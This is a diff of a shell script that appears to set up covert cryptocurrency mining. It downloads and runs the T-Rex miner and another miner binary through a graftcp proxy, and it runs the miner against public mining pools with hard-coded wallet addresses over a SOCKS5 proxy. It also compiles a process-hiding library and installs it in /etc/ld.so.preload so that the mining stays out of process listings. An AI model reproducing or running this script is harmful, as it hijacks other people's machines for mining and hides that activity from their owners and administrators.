@@ -33,8 +33,9 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz
+tar -zxf t-rex-0.26.4-linux.tar.gz
+chmod +x t-rex
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -42,4 +43,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --url=ssl://0xbc48b8bdce572defe4dcab85103f140099bc5af5.DO@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./t-rex -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 3Ev3mZawL4TRxeC2Li91gZg5Yrx1k5npL7 -w DENT -p x --proxy socks5://192.252.211.197:14921
